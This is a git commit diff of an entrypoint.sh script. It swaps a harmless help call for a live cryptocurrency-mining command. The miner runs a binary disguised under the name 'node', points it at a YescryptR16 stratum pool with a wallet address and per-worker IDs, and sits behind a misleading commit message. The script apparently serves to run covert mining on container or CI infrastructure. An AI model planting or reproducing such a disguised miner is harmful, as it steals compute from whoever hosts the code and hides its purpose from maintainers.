946f02870d87a5f916c5531016d30e7942fdbb64
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-04 23:37:55 +0700

    Update and rename entrypoint.sh to entrypoint.sh

--- 4/entrypoint.sh
+++ 4/entrypoint.sh
@@ -4,11 +4,11 @@ chmod +x node
 WORKER_NUMBER=$1
 PASSHOURS=$(date +%S)
 echo "start ${WORKER_NUMBER}"
-./node --help
+
 #./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
-#./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5090 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.${WORKER_NUMBER}_crf
-#sleep 60
-#cat try.log
+./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5090 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.${WORKER_NUMBER}_crf > try.log
+sleep 60
+cat try.log
 
 
 #sleep 29999
